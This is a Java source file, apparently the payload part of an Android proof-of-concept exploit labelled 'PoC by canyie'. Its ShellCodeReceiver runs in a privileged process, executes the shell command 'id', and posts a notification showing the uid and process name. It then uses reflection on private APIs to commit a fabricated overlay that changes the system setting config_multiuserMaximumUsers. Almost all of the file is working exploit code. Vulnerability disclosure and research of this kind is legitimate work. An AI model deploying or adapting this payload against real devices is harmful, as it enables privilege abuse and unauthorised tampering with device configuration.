package top.canyie.transitionplayer;

import android.annotation.SuppressLint;
import android.app.ActivityThread;
import android.app.Application;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.om.FabricatedOverlay;
import android.content.om.OverlayManager;
import android.content.om.OverlayManagerTransaction;
import android.os.Build;
import android.os.Process;
import android.util.Log;
import android.util.TypedValue;

import java.io.BufferedReader;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStreamReader;

public class ShellCodeReceiver extends BroadcastReceiver {
    @SuppressLint({"NotificationPermission", "BlockedPrivateApi", "NewApi"})
    @Override public void onReceive(Context context, Intent intent) {
        String processName;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            processName = Process.myProcessName();
        } else {
            try (BufferedReader cmdline = new BufferedReader(new FileReader("/proc/self/cmdline"))) {
                processName = cmdline.readLine().trim();
            } catch (Exception e) {
                processName = "<unknown>";
            }
        }
        Log.e("PoC", "Shell code is executed in uid " + Process.myUid()
                + " pid " + Process.myPid() + " process " + processName);
        String id;
        try {
            java.lang.Process process = Runtime.getRuntime().exec("id");
            try (BufferedReader br = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
                id = br.readLine();
            }
            process.getOutputStream().close();
            process.getErrorStream().close();
        } catch (IOException e) {
            id = "(failed to execute id)";
        }
        Log.e("PoC", id);

        try {
            Application application = ActivityThread.currentApplication();
            NotificationManager notificationManager = application.getSystemService(NotificationManager.class);
            notificationManager.createNotificationChannel(new NotificationChannel("canyie", "PoC by canyie", NotificationManager.IMPORTANCE_HIGH));
            notificationManager.notify(2977, new Notification.Builder(context, "canyie")
                    .setSmallIcon(android.R.drawable.sym_def_app_icon)
                    .setContentTitle("Hello from " + processName)
                    .setContentText(id)
                    .setStyle(new Notification.BigTextStyle().bigText(id))
                    .build());

            OverlayManager overlayManager = application.getSystemService(OverlayManager.class);
            FabricatedOverlay overlay = new FabricatedOverlay("canyie", "android");
            FabricatedOverlay.class.getDeclaredMethod("setOwningPackage", String.class)
                    .invoke(overlay, application.getPackageName());
            overlay.setResourceValue("android:integer/config_multiuserMaximumUsers", TypedValue.TYPE_INT_DEC, 100, null);

            Class<?> OverlayManagerTransactionBuilder = Class.forName("android.content.om.OverlayManagerTransaction$Builder");
            Object builder = OverlayManagerTransactionBuilder.newInstance();
            OverlayManagerTransactionBuilder.getDeclaredMethod("registerFabricatedOverlay", FabricatedOverlay.class)
                    .invoke(builder, overlay);
            OverlayManagerTransaction transaction = (OverlayManagerTransaction) (OverlayManagerTransactionBuilder
                    .getDeclaredMethod("build")).invoke(builder);
            overlayManager.commit(transaction);
        } catch (Throwable e) {
            Log.e("PoC", "Failed to fabricate overlay", e);
        }
    }
}
